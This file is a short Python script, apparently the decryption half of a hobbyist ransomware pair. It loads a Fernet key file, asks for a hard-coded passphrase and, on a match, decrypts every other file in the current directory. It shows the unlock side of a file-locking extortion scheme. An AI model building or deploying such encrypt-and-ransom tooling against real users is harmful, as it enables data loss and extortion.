import os
from cryptography.fernet import Fernet

with open("encryption_key.key", "rb") as key:
    secret_key = key.read()

files = []

secret_word = "@_wtf_saurabh"

user_phrase = input("Enter the correct word to DECRYPT your files:- \n")

for file in os.listdir():
    if file == "Encrypter.py" or file == "encryption_key.key" or file == "Decrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

if user_phrase == secret_word:

     for file in files:

        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as thefile:

           thefile.write(contents_decrypted)
        print("SUCCESSFULLY DECRYPTED")
else:
    print('Wrong word')

